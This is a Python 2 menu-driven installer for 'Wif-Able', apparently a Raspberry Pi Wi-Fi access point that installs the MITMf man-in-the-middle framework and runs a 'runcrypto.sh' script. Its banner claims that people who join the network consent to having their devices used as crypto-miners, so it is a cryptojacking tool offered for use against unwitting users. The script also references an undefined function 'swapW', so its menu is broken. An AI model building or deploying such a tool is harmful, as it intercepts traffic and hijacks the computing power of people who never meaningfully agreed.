#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author          :SimplyPancake
#python_version  :2.7.6
#================================================================
				#SETUP
#================================================================
# Import the modules needed to run the script.
import sys, os

# Main definition - constants
menu_actions  = {}

# =======================
#     MENUS FUNCTIONS
# =======================

# Main menu
def main_menu():
    os.system('clear')

    print"""

___       __________________________ ______
__ |     / /__(_)__  __/__    |__  /____  /____
__ | /| / /__  /__  /_ __  /| |_  __ \_  /_  _ \
__ |/ |/ / _  / _  __/ _  ___ |  /_/ /  / /  __/
____/|__/  /_/  /_/    /_/  |_/_.___//_/  \___/


v1.0

Please run Wif-Able installer with administrator priveleges!
With installing this script people who use your network give permission to use their devices as crypto-miners.
"""
    print "Please choose the menu you want to start:"
    print "1.   Install Wif-Able"
    print "2.   Run Wif-Able(!not running will not make you money!)"
    print "3.   Switch between AP mode and CLient mode"
    print "\n99. Quit"
    choice = raw_input(" >>  ")
    exec_menu(choice)

    return

# Execute menu
def exec_menu(choice):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, please try again.\n"
            menu_actions['main_menu']()
    return

# Install
def installW():
    os.system('apt-get update')
    #installing the mitmf dependecies now
    os.system('apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file')
    os.system('pip install Twisted==15.5.0')
    os.system('git clone https://github.com/byt3bl33d3r/MITMf')
    os.system('cd MITMf && git submodule init && git submodule update --recursive')
    #upgrading pip...
    os.system('pip install --upgrade pip')
    #installing some requirements for mitmf with pip
    os.system('cd MITMf && sudo pip install -r requirements.txt')
    os.system('sudo pip install pyinotify')



    #installing the router setup
    os.system('sudo ./rPi3-ap-setup.sh Pancake Wif-Able')
    os.system('sudo reboot')
    return


# Run
def runW():
    print "Make sure Wif-Able is installed first!"
    os.system('sudo ./runcrypto.sh')
    return

def swapw():
    print "Swapping between AP mode and Client mode!"
    os.system('sudo swapwifi')

# Exit program
def exit():
    sys.exit()

# =======================
#    MENUS DEFINITIONS
# =======================

# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': installW,
    '2': runW,
    '3': swapW,
    '99': exit,
}

# =======================
#      MAIN PROGRAM
# =======================

# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()
